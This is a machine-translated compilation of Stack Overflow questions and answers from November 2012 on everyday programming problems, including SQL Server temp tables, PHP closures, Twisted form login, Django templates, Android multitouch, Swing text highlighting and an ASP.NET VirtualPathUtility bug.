这是官方的 Fiddle 之一，[http://jsfiddle.net/gh/get/jquery/1.7.2/highslide-software/highcharts.com/tree/master/samples/highcharts/demo/line-basic/](http://jsfiddle.net/gh/get/jquery/1.7.2/highslide-software/highcharts.com/tree/master/samples/highcharts/demo/line-basic/)，他们管理好，但我看不出我做错了什么/不同。

我知道这会非常容易，但我看不到。谁能指出我正确的方向？

谢谢，格雷格。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T13:00:37.463

如果使用日期时间 x 轴，您需要将数据按日期升序排列。

# sql-server - 重命名临时表时出错

> ID：13360377
> 
> 赞同：7
> 
> 时间：2012-11-13T11:59:55.513
> 
> 标签：sql-server, sql-server-2008-r2

是否可以重命名临时表？

```
create table #t (id integer);
execute tempdb.sys.sp_rename '#t', '#s';

An invalid parameter or option was specified for procedure 'sys.sp_rename' 
```

@Michel 提出的解决方案，插入另一个临时表并删除原始表，可行，但我猜它有多贵。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T12:08:02.660

Tempdb 没有 sp_rename 过程。你可以做的是用你旧的内容创建一个新的 temptable

像这样的东西

```
select * into #NewName from #OldName
drop table #OldName 
```

# jquery - 用于在照片中定位水印的 jQuery 插件

> ID：13360380
> 
> 赞同：1
> 
> 时间：2012-11-13T12:00:12.633
> 
> 标签：jquery, jquery-plugins, draggable, watermark

前段时间我正在搜索一个可以帮助我在照片上移动水印的 jQuery 插件。请参见下图中的示例：

![密封移动](../Images/c66a7a869da83fe22bd9e757a8943e36.png)

你知道吗？我需要返回相对于照片的 X 和 Y 坐标。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:03:32.033

[你可以在这里](http://www.patrick-wied.at/static/watermarkjs/jq/)用 jquery试试这个

可以在此插件中实现拖动能力[here](http://fmaz.developpez.com/proj/imgwatermark/download.html)

# php - 使用闭包时出现奇怪的 PHP 编译器错误

> ID：13360382
> 
> 赞同：2
> 
> 时间：2012-11-13T12:00:16.550
> 
> 标签：php

下面的代码有什么问题？

当我尝试运行 linter 时，它给了我：

```
# PHP Parse error:  syntax error, unexpected '}' in test.ph on line 19

<?php

   function foo()
    {

        return function() 

        {
            print 'bar';
        }    
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:03:45.837

[返回](http://php.net/manual/en/functions.returning-values.php) [表达式](http://php.net/manual/en/language.expressions.php)需要结束并具有正确的语法。

```
// correct syntax
return EXPRESION;

// your function
function foo()
{
    return function()
    {
        print 'bar';
    }; // You need to add a semicolon.
} 
```

# java - 如何从html中获取图像数据

> ID：13360383
> 
> 赞同：1
> 
> 时间：2012-11-13T12:00:22.590
> 
> 标签：java, android, web

我有 html 响应，其中包含一些图像数据：

```
String response_string = EntityUtils.toString(response.getEntity(), "UTF-8");       
Document doc = Jsoup.parse(response_string, "UTF-8");
Elements els = doc.select("div.blockItem.vevent");
for (Element e : els) {
    Uri uri = Uri.parse(doc.select("div.blockPhoto > a[href]").get(0).attr("href"));
    String img = doc.select("img[src].photo").get(0).attr("src"); 
```

通过这种方式，我获得了图像的相对 src，我可以使用它来请求服务器获取图像。但我不明白 - 有图像数据的响应吗？我通过以下步骤对其进行了测试：

*   得到回应
*   将响应的 html 作为字符串保存在内存中
*   关闭设备与互联网的连接
*   在 WebView 中打开 html

最后我看到页面有图像。如果响应还有图像的数据我应该如何获取它，它可能是由我用来建立连接的 HttpCient 实例散列的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:38:51.833

可能您的浏览器或代理已经缓存了图像，因此关闭您的互联网连接并没有显示任何效果。

查看原始 HTML 源代码。

如果有这样的`img`标签：

```
<img src="pathToImage" /> 
```

那么图像不是响应的一部分。

如果有这样的标签：

```
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAM0AAAD .... etc"/> 
```

那么图像是响应的一部分。在这种情况下，您必须对数据进行 Base64 解码才能将其转换为图像。

# python - 使用twisted web登录网页

> ID：13360387
> 
> 赞同：1
> 
> 时间：2012-11-13T12:00:47.720
> 
> 标签：python, login, web, client, twisted

我想使用twisted编写一个简单的网络客户端，它使用用户名和密码登录到一个网站，并从给定页面获取一些数据。做这个的最好方式是什么？

编辑：添加更多细节：这是一个简单的用户名/密码 HTML 表单提交。涉及一个 PHPSESSID cookie，这是一个 PHP 站点。没有验证码。没有 HTTP 身份验证。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-14T13:31:09.877

HTML 表单认证是通过提交认证表单来完成的。这意味着知道表单动作和方法。对于初学者，您可以手动阅读页面源并找出此信息。更通用的解决方案将涉及解析页面（可能使用 lxml 或 html5lib 之类的东西）并自动提取此信息。

您还需要知道表单中用户名和密码字段的名称，以及任何其他必填表单字段的名称和正确值。

例如，一个看起来像这样的表单：

```
<form action="https://example.com/auth" method="post">
    <input type="text" name="Email" id="Email" value="">
    <input type="password" name="Password" id="Password" value="">
</form> 
```

有一个 的形式动作`https://example.com/auth`和一个 的方法`post`。因此，您需要`POST`向`https://example.com/auth`.

按照惯例，此类请求中数据的编码`application/x-www-form-urlencoded`用作其内容类型。

您可以使用 Python stdlib 对此类请求的正文进行编码`urllib.urlencode`。

最后，如果身份验证成功被表示为一个 cookie，必须在未来的请求中重新呈现，您需要确保捕获 cookie 的值并重新发送它。

所以，把这一切放在一起：

```
from twisted.web.client import getPage

cookies = {}
d = getPage(
    "https://example.com/auth",
    method="POST",
    headers={"content-type": "application/x-www-form-urlencoded"},
    postdata=urllib.urlencode(dict(Email="alice@example.com", Password="secret")),
    cookies=cookies) 
```

字典将`cookie`填充服务器设置的任何 cookie 的值。`getPage`将它与您希望使用此身份验证结果的任何未来调用一起传递。

尽管如此，我喜欢使用scrapy的建议。它会为你做很多低级的事情，让你专注于问题中更有趣的部分。

# wordpress - 更改阅读更多链接 WordPress

> ID：13360388
> 
> 赞同：1
> 
> 时间：2012-11-13T12:00:49.650
> 
> 标签：wordpress, button, hyperlink

我想更改 WordPress 中的阅读更多链接，我找到了一些教程，`<!-- more -->`我可以在其中编写其他内容`<!-- more Proceed... -->`（这不起作用）。在 index.php 中我应该编辑`<?php the_content('Read More..,'); ?>`，但在我的 index.php 中没有 Read More 文本，它看起来像这样`<?php the_content(''); ?>`，它是空的，它仍然在帖子上显示 Read More。

任何其他想法如何改变它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-27T18:19:11.600

在 function.php 文件中添加这段代码

```
// Replaces the excerpt "more" text by a link
function new_excerpt_more($more) {
   global $post;
   return '<a class="moretag" href="'. get_permalink($post->ID) . '"> Read more...      </a>';
}
add_filter('excerpt_more', 'new_excerpt_more'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T20:32:34.180

您可以更改

```
<?php the_content(''); ?> 
```

进入任何你想要的。所以你可以做到：

```
<?php the_content('more Proceed... '); ?> 
```

或任何你想要的。当您保持打开状态时，“阅读更多...”是默认设置。

# django - Django模板如何将选中的值设置到下拉框

> ID：13360389
> 
> 赞同：1
> 
> 时间：2012-11-13T12:00:52.203
> 
> 标签：django, django-templates

```
 <select id="_count_id">
        {% for item in list_count %}
            <option value="{{ item }}" {% if item==count %}selected="selected"{% endif %}>{{ item }}</option>
        {% endfor %}
    </select> 
```

嗯，使用上面的代码将选定的值设置为 html 下拉列表，尽管它不起作用。count 是一个数字值，item 是从 1 到 99 的任何值。我不知道我在哪里做错了什么。任何人都可以帮忙吗？先感谢您

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T14:38:14.987

I get this error when running it

```
Exception Value: Could not parse the remainder: '==count' from 'item==count' 
```

If changing it to item == count (with spaces around '=='), it works.

# android - 如何检测 ImageView 上的第二个手指触摸？

> ID：13360390
> 
> 赞同：0
> 
> 时间：2012-11-13T12:01:01.040
> 
> 标签：android

如何检测多点触控事件？我尝试的代码是：

```
ImageView im = (ImageView) findViewById(R.id.imageView1);
im.setOnTouchListener(new OnTouchListener() {
  @Override
  public boolean onTouch(View v, MotionEvent event) {
    switch (event.getAction() & MotionEvent.ACTION_MASK) {
      case MotionEvent.ACTION_POINTER_DOWN:
        Log.e("case MotionEvent.ACTION_POINTER_DOWN","case MotionEvent.ACTION_POINTER_DOWN");
        break;
      case MotionEvent.ACTION_DOWN:
        Log.e("case MotionEvent.ACTION_DOWN","case MotionEvent.ACTION_DOWN");
        break;
      case MotionEvent.ACTION_UP:
        Log.e("case MotionEvent.ACTION_UP","case MotionEvent.ACTION_UP");
        break;
      case MotionEvent.ACTION_MOVE:
        Log.e("case MotionEvent.ACTION_MOVE","case MotionEvent.ACTION_MOVE");
        break;
    }
    return false;
  }
}); 
```

它检测到第一次触摸，日志 cat 中的输出是 MotionEvent.ACTION_POINTER_DOWN。如何知道是否发生了第二次触摸？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:58:16.427

您应该在 xml 布局文件中将以下行添加到 imageView1：

```
android:longClickable="true" 
```

这将启用长点击和其他事件也将被接收。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T13:04:36.663

有很多方法可以做到这一点，所以你可以在这里选择其中一些链接已经编写了一个完整的应用程序来处理多点触控。

[多点触摸](http://android-developers.blogspot.com/2010/06/making-sense-of-multitouch.html)

[多点触控](http://www.mysecretroom.com/www/programming-and-software/android-multi-touch-handling)

# mysql - 插入具有特定值的新行

> ID：13360391
> 
> 赞同：0
> 
> 时间：2012-11-13T12:01:03.597
> 
> 标签：mysql, sql

在 1 个表中，我需要根据其他表值插入具有特定值的特定行。

```
UPDATE item_properties2 AS P
INNER JOIN items ON items.id = P.item
INNER JOIN item_groups ON item_groups.idp = items.group_id 
SET P.nr = '0'
WHERE P.type = 1140614900 AND items_groups.idp = '1140503406'; 
```

这将更新表。但我需要的基本上是。

( `id`, `type`, `item`, `value`, `shows`, `nr`) 值 (78173, 1336983282, 1352706945, 'test Laisvai Pastomas Sharp', 0, 1)

item_properties2.Id - 只是行 id，
`item_properties2.type`- 连接到 item_property_groups2.id ，
'item_properties2.item' 这连接到 item.id ，
item.id 有另一列 item.group_id ，
item.group_id 连接到 item_groups.id 有另一列裸 item_groups.idp 。

我只需要选择 items_groups.idp = '1140503406' 。基本上我应该在 item_properties2 中添加具有我输入的特定类型值的行，并且只添加到具有特定 item_properties2 的模型中。项目符合 item_groups.idp 。我不知道该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:38:45.180

有一些方法可以将 2 个表中的大量数据插入到较新的表中。

这可以这样做：

```
INSERT INTO item_properties2 (id, type, item, value, shows, nr)
SELECT Yid, Ytype,Yitem,Yvalue, Yshows, Ynr
FROM items
INNER JOIN item_groups ON item_groups.idp = items.group_id
WHERE  items_groups.idp = '1140503406' 
```

您现在将调用特定的 select 语句，而不是使用 VALUES 标记。您只需要将上面的 Y 值更改为您自己的列名。

或者您可以将输入放入存储过程中，上述查询将在您的 2 个表上运行，并将与 where 语句一起使用的值插入到第 3 个表中。

```
 CREATE PROCEDURE sInput
    ( @val1 int, @val2 int, @val3 varchar(10))
    AS
    INSERT INTO MyTable(val1, val2, val3)
    VALUES(@val1, @val2, @val3)
    return 
```

# windows - 即使在启用并授予权限后，SVN pre-revprop-change 错误

> ID：13360392
> 
> 赞同：1
> 
> 时间：2012-11-13T12:01:05.673
> 
> 标签：windows, svn, tortoisesvn

我正在尝试将我的日志从 Windows 客户端编辑到 Linux 存储库，我知道默认情况下 svn 不允许这种行为，所以我创建了这样的 pre-revprop-change （我将授予每次编辑）：

```
#!/bin/sh
exit 0; 
```

授予权限：

```
chmod +x pre-revprop-change 
```

我仍然收到此错误：

```
SharpSvn.SvnRepositoryIOException: DAV request failed; it's possible that the
repository's pre-revprop-change hook either failed or is non-existent ---> 
SharpSvn.SvnRepositoryIOException: At least one property change failed; repository is 
unchanged ---> SharpSvn.SvnRepositoryIOException: Error setting property 'log': 
Repository has not been enabled to accept revision propchanges;
ask the administrator to create a pre-revprop-change hook 
```

# regex - 字符串的 perl 正则表达式

> ID：13360404
> 
> 赞同：-3
> 
> 时间：2012-11-13T12:02:12.457
> 
> 标签：regex, perl, string-parsing, scraper

我有一个字符串，我需要从中提取 street、city、state、zip 。

字符串可能看起来像

```
 a)$str1  ="2500 South 3850 West Suite A Salt Lake City, UT 84120-7225";
    b)$str2 ="19701 DaVinci  Lake Forest, CA 92610";
    c)$str3="abc ,def ,ca 1234"; -->(note there are two commas in this one) 
```

我目前正在使用 split 函数来获取一个数组并使用这些值来完成我的工作，但我想要一个正则表达式来为我完成任务。我将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T15:40:14.743

我同意*弗洛里安*：一旦你得到一个正则表达式工作，你就会引入一个新的字符串，它不会工作，你的编会失败。

话虽如此，这是一个适用*于您的示例*的正则表达式：

```
#!/usr/bin/perl
use strict;
use warnings;

my $addr1 = "2500 South 3850 West Suite A Salt Lake City, UT 84120-7225";
my $addr2 = "19701 DaVinci  Lake Forest, CA 92610";
my $addr3 = "abc ,def ,ca 1234";

for my $addr($addr1,$addr2,$addr3){
  $addr =~ m/^(.*),[ \t]*([a-zA-Z]{2})[ \t]([0-9\-]*)$/;
  print "\naddr : '$1'\n";
  print "state: '$2'\n";
  print "zip  : '$3'\n";
} 
```

但是，它无法解析 City，因为您地址中的逗号不一致。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:08:03.690

一般来说，位置[远非简单](http://regexlib.com/DisplayPatterns.aspx?categoryId=7&cattabindex=6&AspxAutoDetectCookieSupport=1)，我非常有信心，即使您找到适合您的测试用例的位置，您也很可能会遇到正则表达式不正确匹配的情况。

地址非常难以解析，因为您永远无法完全确定，什么字符串将匹配哪个部分。

有些城市有数字。带有特殊字符的街道。唯一接近常规的是邮政编码，您可以相当安全地提取它，但前提是**它**始终位于字符串的末尾。

除此之外，您必须将字符串与某种地址数据库进行匹配，才能知道您提取的城市/街道是否存在。

# java - 在java中突出显示单词

> ID：13360411
> 
> 赞同：3
> 
> 时间：2012-11-13T12:02:39.120
> 
> 标签：java, swing, text, highlight

我想在特定**时间**突出显示这些词（就像在卡拉 OK 应用程序中一样）。每个单词都有一个特定的突出显示时间。我可以计时，但没有找到任何地方。如何在特定的持续时间内突出显示一个单词。在 stackoverflow 和谷歌上搜索了很多，但死路一条。我可以求助于 java 脚本或 html 吗？请帮帮我。这是我如何计时的一段代码：

```
millis mil=new millis();
if(true){

if(flag==1)
    flag=0;
else flag=1;
if(flag==0)
value=mil.done(flag,start);
start=value;
if(flag==1)
value=mil.done(flag,start);//function to calculate duration
}System.out.println("val:"+(value-3086610));
   // System.out.println("gyjghjghjghj"+(System.nanoTime()-start2));
    String s = textArea.getText();

    char[] words=s.toCharArray();

    for(i=last;words[i]!=' '&&words[i]!='\n';i++,last=i)
    {

    }
 try {//System.out.println(acount);
            hilit.addHighlight(first, last, painter);

        last++;   first=last;

        } catch (BadLocationException ex) {
            Logger.getLogger(newh.class.getName()).log(Level.SEVERE, null, ex);
        } 
```

这就是我能够为每个单词计时的方式。
谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:15:41.747

您可以从链接[http://java-sl.com/blink.html开始](http://java-sl.com/blink.html)

将高亮添加到 JTextArea 并让它们闪烁一段时间。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T13:34:37.733

+1 对 StanislavL 的回答。

做了一个简短的例子希望它有所帮助。

在这里，我创造了我的话和他们的时间：

```
int[] timings = {2000, 1000, 4000};
String[] words = new String[]{"Hello", "java", "whoooooh"}; 
```

点击开始按钮后：

![在此处输入图像描述](../Images/eef9f00c7505a7da846e41716176e860.png)

2000 毫秒后：

![在此处输入图像描述](../Images/9604c88516a80b7b91bfae60562c32ac.png)

1000 之后：

![在此处输入图像描述](../Images/1a41ce94eb6888d035588b7ca2bf5df3.png)

4000 毫秒后：

![在此处输入图像描述](../Images/0bbfc75d4e8149a8eafd8631e722eec9.png)

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.AbstractAction;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JTextPane;
import javax.swing.SwingUtilities;
import javax.swing.Timer;
import javax.swing.text.BadLocationException;
import javax.swing.text.DefaultHighlighter;

public class KaraokeTest {

    private int[] timings = {2000, 1000, 4000};
    private String[] words = new String[]{"Hello", "java", "whoooooh"};
    private DefaultHighlighter.DefaultHighlightPainter highlightPainter = new DefaultHighlighter.DefaultHighlightPainter(Color.GREEN);
    private int count = 0;
    private boolean fisrTime = true;
    private JFrame frame;
    private JTextPane jtp;
    JButton startButton;

    public KaraokeTest() {
        initComponents();
    }

    private void initComponents() {
        frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setResizable(false);

        jtp = new JTextPane();

        for (String s : words) {
            String tmp = jtp.getText();
            if (tmp.equals("")) {
                jtp.setText(s);
            } else {
                jtp.setText(tmp + " " + s);
            }
        }

        startButton = new JButton("Start");
        startButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                startKaraoke();
            }
        });

        frame.add(jtp, BorderLayout.CENTER);
        frame.add(startButton, BorderLayout.SOUTH);

        frame.pack();
        frame.setVisible(true);
    }

    private void startKaraoke() {
        if (fisrTime) {
            startButton.setEnabled(false);
            fisrTime = false;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {

                Timer t = createAndStartTimer(timings[count], count);

                while (t.isRunning()) {//wait for timer to be done
                    try {
                        Thread.sleep(1);
                    } catch (InterruptedException ex) {
                        ex.printStackTrace();
                    }
                }

                SwingUtilities.invokeLater(new Runnable() {
                    @Override
                    public void run() {
                        count++;
                        if (count == timings.length) {
                            JOptionPane.showMessageDialog(frame, "Done");
                            startButton.setEnabled(true);
                            count = 0;
                        } else {
                            startKaraoke();
                        }
                    }
                });

            }
        }).start();
    }

    private Timer createAndStartTimer(int delay, final int count) {

        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                int sp = 0;
                for (int i = 0; i < count; i++) {
                    sp += words[i].length() + 1;
                }
                try {
                    jtp.getHighlighter().addHighlight(sp, sp + words[count].length(), highlightPainter);
                } catch (BadLocationException ex) {
                    ex.printStackTrace();
                }
            }
        });

        Timer t = new Timer(delay, new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                jtp.getHighlighter().removeAllHighlights();
            }
        });
        t.setRepeats(false);
        t.start();
        return t;
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new KaraokeTest();
            }
        });
    }
} 
```

**更新：**

修复了上面的代码，以便能够在指定的时间内突出显示句子中的单个字符：

![在此处输入图像描述](../Images/6a2b3f003892d6185d0e63c0c6412c41.png)

![在此处输入图像描述](../Images/3af3867fd9fa6b37a2966bc38808f628.png)

![在此处输入图像描述](../Images/5a756246673fa1dbcf527f5a629be5a4.png)

![在此处输入图像描述](../Images/f18b56e36cb0a0b9c06919af6573e08b.png)

![在此处输入图像描述](../Images/f18b56e36cb0a0b9c06919af6573e08b.png)

![在此处输入图像描述](../Images/e87a49ef9024a94998ac8f2a992063f8.png)

![在此处输入图像描述](../Images/83b97b90381a115d20e2d695e50f3d0d.png)

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.AbstractAction;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JTextPane;
import javax.swing.SwingUtilities;
import javax.swing.Timer;
import javax.swing.text.BadLocationException;
import javax.swing.text.DefaultHighlighter;

public class KaraokeTest {

    private int[] timings = {2000, 1000, 4000, 2000, 3000};//char timings
    private String[] words = {"H", "e", "l", "l", "o"};//each indiviaul word
    private String sentence = "Hello";//entire string for writing to JSCrollPane
    private DefaultHighlighter.DefaultHighlightPainter highlightPainter = new DefaultHighlighter.DefaultHighlightPainter(Color.GREEN);
    private int count = 0;
    private boolean fisrTime = true;
    private JFrame frame;
    private JTextPane jtp;
    JButton startButton;

    public KaraokeTest() {
        initComponents();
    }

    private void initComponents() {
        frame = new JFrame();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setResizable(false);

        jtp = new JTextPane();

        jtp.setText(sentence);

        startButton = new JButton("Start");
        startButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                startKaraoke();
            }
        });

        frame.add(jtp, BorderLayout.CENTER);
        frame.add(startButton, BorderLayout.SOUTH);

        frame.pack();
        frame.setVisible(true);
    }

    private void startKaraoke() {
        if (fisrTime) {
            startButton.setEnabled(false);
            fisrTime = false;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {

                Timer t = createAndStartTimer(timings[count], count);

                while (t.isRunning()) {//wait for timer to be done
                    try {
                        Thread.sleep(1);
                    } catch (InterruptedException ex) {
                        ex.printStackTrace();
                    }
                }

                SwingUtilities.invokeLater(new Runnable() {
                    @Override
                    public void run() {
                        count++;
                        if (count == timings.length) {
                            JOptionPane.showMessageDialog(frame, "Done");
                            startButton.setEnabled(true);
                            count = 0;
                            fisrTime = true;
                        } else {
                            startKaraoke();
                        }
                    }
                });

            }
        }).start();
    }

    private Timer createAndStartTimer(int delay, final int count) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                int sp = 0;
                for (int i = 0; i < count; i++) {
                    sp += words[i].length();
                }
                try {
                    jtp.getHighlighter().addHighlight(sp, sp + words[count].length(), highlightPainter);
                } catch (BadLocationException ex) {
                    ex.printStackTrace();
                }
            }
        });
        Timer t = new Timer(delay, new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                jtp.getHighlighter().removeAllHighlights();
            }
        });
        t.setRepeats(false);
        t.start();
        return t;
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new KaraokeTest();
            }
        });
    }
} 
```

# php - 在不知道现有维度的情况下动态排序数组

> ID：13360416
> 
> 赞同：0
> 
> 时间：2012-11-13T12:03:04.293
> 
> 标签：php, sorting, multidimensional-array

我知道这`ksort()`是用来**按键**排序数组。我的数组的最大维度总是不同的。有时是 2 维，有时是 5 维，有时是 10 维，那么我如何在`ksort()`不知道其中存在多少维的情况下动态地进行排序？

谢谢

**示例数组**

```
[2010] => Array
        (
            [3] => Array
                (
                    [B] => Array
                        (
                            [6] => Array
                                (
                                    [Patato] => 
                                )

                            [C] => Array
                                (
                                    [Patato] => 
                                    [Zozo] => 
                                )
                        )

                    [A] => Array
                        (
                            [F] => Array
                                (
                                    [Tomato] => 
                                    [Apple] => 
                                    [Kiwi] => 
                                )
                        )

            [1] => Array
                (
                    [4] => Array
                        (
                            [A] => Array
                                (
                                    [Orange] => 
                                )
                        ) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:07:13.307

如果您的意思是要递归排序：

```
function deep_ksort(&$arr) {
    ksort($arr);
    foreach ($arr as &$a) {
        if (is_array($a) && !empty($a)) {
            deep_ksort($a);
        }
    }
} 
```

这来自[http://www.php.net/manual/en/function.ksort.php#105399](http://www.php.net/manual/en/function.ksort.php#105399)

# windows-phone-7 - 将图像设置为网格的最大高度

> ID：13360417
> 
> 赞同：2
> 
> 时间：2012-11-13T12:03:09.253
> 
> 标签：windows-phone-7, xaml, grid-layout

在我的 XAML 中，我有一个列表视图。列表视图的项目模板包含一个网格。这个网格有 4 列和 2 行。像这样：
![xaml 项目模板](../Images/93803b57d49e1c2ebbacf406058a42b4.png)

我希望左列填充图像和图像下方的彩色条。我的核心问题是图像大部分时间会决定项目的高度。虽然图像最大高度应该由项目的其余部分定义。所以最小100（网格`MinHeight="125"`-`Height="25"`矩形）。如果文本使项目变大，则更大。但是文本应该定义项目的高度。不是图像。

我当前的 xaml 如下：

```
<Grid MinHeight="125">
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="auto" />
        <ColumnDefinition Width="2*" />
        <ColumnDefinition Width="*" />
        <ColumnDefinition Width="48" />
    </Grid.ColumnDefinitions>
    <Grid.RowDefinitions>
        <RowDefinition Height="auto" />
        <RowDefinition Height="*" />
    </Grid.RowDefinitions>
    <Grid Grid.Row="0" Grid.RowSpan="2" Grid.Column="0" Width="100">
        <Grid.RowDefinitions>
            <RowDefinition Height="auto" />
            <RowDefinition Height="25" />
        </Grid.RowDefinitions>
        <Image Grid.Row="0" Source="{Binding Path=BitmapImage}" Stretch="UniformToFill" />
        <Rectangle Grid.Row="1">
            <Rectangle.Fill>
                <SolidColorBrush Color="{Binding Path=Color}" />
            </Rectangle.Fill>
        </Rectangle>
    </Grid>
    <TextBlock Grid.Row="0" Grid.Column="1" Text="{Binding Path=Name}" FontWeight="ExtraBold" TextWrapping="Wrap" FontSize="16" />
    <TextBlock Grid.Row="1" Grid.Column="1" Text="{Binding Path=Description}" TextWrapping="Wrap" FontSize="20" />
    <TextBlock Grid.Row="0" Grid.RowSpan="2" Grid.Column="2" Text="{Binding Path=Type}" HorizontalAlignment="Center" VerticalAlignment="Center" TextWrapping="Wrap" FontSize="20" Margin="5" />
    <TextBlock Grid.Row="0" Grid.Column="3" Text="{Binding Path=Distance, Converter={StaticResource DistanceConverter}}" FontSize="16" />
    <Image Grid.Column="3" Grid.RowSpan="2" Source="/Images/appbar.next.rest.png" Stretch="Fill" Width="24" Height="24" />
</Grid> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:22:26.437

[http://darutk-oboegaki.blogspot.com/2011/07/binding-actualheight-and-actualwidth.html](http://darutk-oboegaki.blogspot.com/2011/07/binding-actualheight-and-actualwidth.html)包含有关如何执行此操作的信息，说明在 Silverlight 中`ActualHeight`通常给出的值是`0`.

从那里，如果您需要减去 25 个像素，您可以：

*   编写转换器（实现的对象`System.Windows.UI.Xaml.Data.IValueConverter`）
*   将转换器的实例添加到页面/窗口的资源中。
*   添加`Converter={StaticResource MyConverter}, ConverterParameter=25`到您的绑定中。

希望有帮助:)

# c# - 为什么我会从 VirtualPathUtility ToAbsolute 获得带有某些路径的 HttpException？

> ID：13360419
> 
> 赞同：4
> 
> 时间：2012-11-13T12:03:18.137
> 
> 标签：c#, asp.net, .net-3.5, system.web, httpexception

我正在尝试使用[`VirtualPathUtility.ToAbsolute`](http://msdn.microsoft.com/en-us/library/ms150160%28v=vs.90%29.aspx)将应用程序相对路径（例如 ）解析`~/MyPage.aspx`为应用程序绝对路径（例如`/MySite/MyApp/MyPage.aspx`. 但是，对于某些路径，我收到一条`HttpException`说我的路径“不是有效的虚拟路径”的说法。例子：

```
// This works:
var abs1 = VirtualPathUtility.ToAbsolute("~/MyPage.aspx#anchor");

// This errors:
var abs2 = VirtualPathUtility.ToAbsolute("~/MyPage.aspx?key=value"); 
```

这是怎么回事？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-13T12:03:18.137

因为您使用的是 .NET 3.5，所以您使用的是程序集，该程序集存在被此方法视为非法路径字符`2.0` `System.Web`的缺陷。[这在特定于版本的 MSDN 页面](http://msdn.microsoft.com/en-us/library/ms150160%28v=vs.90%29.aspx)`?`上的社区评论中有所提及。

通过反汇编可以看出，调用以 ( `internal`)结尾`VirtualPath.Create`，其中有：

```
 else if (VirtualPath.ContainsIllegalVirtualPathChars(virtualPath))
  {
    throw new HttpException(System.Web.SR.GetString("Invalid_vpath", new object[1]
    {
      (object) virtualPath
    }));
  } 
```

其中引用

```
private static char[] s_illegalVirtualPathChars = new char[4]
{
  ':',
  '?',
  '*',
  char.MinValue
}; 
```

其中一些可以合理地被视为路径的坏字符，但`?`不应该被如此拒绝。

已被重写的`4.0` `System.Web`节目的拆卸更加挑剔。`VirtualPath.Create`

[这个 web.archive 捕获的一篇现已失效的 blogs.msdn 帖子](http://web.archive.org/web/20100330050530/http://blogs.msdn.com/dmitryr/archive/2006/02/21/536552.aspx)显示了最早提到这个问题的地方之一。MS 员工回应：

> 2006 年 2 月 26 日，星期日，晚上 11:49，作者：DmitryR 例外`~/path?qs` 是我需要修复的错误...
> 
> 最简单的解决方法是 `ResolveAppRelativeLinkToUrl`在调用 `VirtualPathUtility.ToAbsolute`.
> 
> 一种解决方法是使用完全限定的 UTL，而不是“~/...”。
> 
> 谢谢，
> 
> 德米特里

where`ResolveAppRelativeLinkToUrl`指的是报告者代码的方法名称。

另一种解决方法是`?`在调用 之前用安全令牌`VirtualPathUtility.ToAbsolute`替换，然后撤消替换：

```
public static string SafeToAbsolute(string path)
{
    var madeSafe = path.Replace("?", "UNLIKELY_TOKEN");
    var absolute = VirtualPathUtility.ToAbsolute(madeSafe);
    var restored = absolute.Replace("UNLIKELY_TOKEN", "?");
    return restored;
} 
```

为您的应用程序选择合适的不太可能的令牌。

# reporting-services - 多维数据集未显示在 BIDS 或 Excel 2007 的查询设计器中

> ID：13360422
> 
> 赞同：0
> 
> 时间：2012-11-13T12:03:25.800
> 
> 标签：reporting-services, ssrs-2008

我在 SSAS 中有几个立方体。所有多维数据集都显示在 SQL Management Studio 的 Analysis Services 中，但在 Excel (2007) 和报表设计器（BIDS 中的 SSRS）中，其中一个不显示。

当前用户是管理员，因此我拥有完全访问权限。

我不知道是什么问题？如果有人解释我应该怎么做，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T04:56:34.640

Cube 已隐藏。Cube 的可见性为 false。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T03:38:01.953

尝试关闭并重新打开 Excel 和 BIDS。它们都缓存有关多维数据集的元数据。

